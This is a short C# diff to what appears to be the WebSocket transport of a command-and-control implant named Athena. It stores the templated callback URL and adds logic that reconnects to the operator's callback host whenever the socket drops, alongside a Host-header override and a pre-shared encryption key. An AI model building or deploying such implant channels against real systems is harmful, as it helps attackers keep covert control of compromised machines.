@@ -42,13 +42,14 @@ namespace Athena
         public PSKCrypto crypt { get; set; }
         public bool encrypted { get; set; }
         public int connectAttempts { get; set; }
+        public string url { get; set; }
 
         public Websocket()
         {
             int callbackPort = Int32.Parse("callback_port");
             string callbackHost = "callback_host";
             this.endpoint = "ENDPOINT_REPLACE";
-            string callbackURL = $"{callbackHost}:{callbackPort}/{this.endpoint}";
+            this.url = $"{callbackHost}:{callbackPort}/{this.endpoint}";
             this.userAgent = "USER_AGENT";
             this.hostHeader = "%HOSTHEADER%";
             this.psk = "AESPSK";
@@ -67,7 +68,7 @@ namespace Athena
                 this.ws.Options.SetRequestHeader("Host", this.hostHeader);
             }
 
-            Connect(callbackURL);
+            Connect(this.url);
         }
 
         public async Task<bool> Connect(string url)
@@ -97,6 +98,11 @@ namespace Athena
 
         public async Task<string> Send(object obj)
         {
+            if(this.ws.State != WebSocketState.Open)
+            {
+                await Connect(this.url);
+            }
+
             try
             {
                 string json = JsonConvert.SerializeObject(obj);
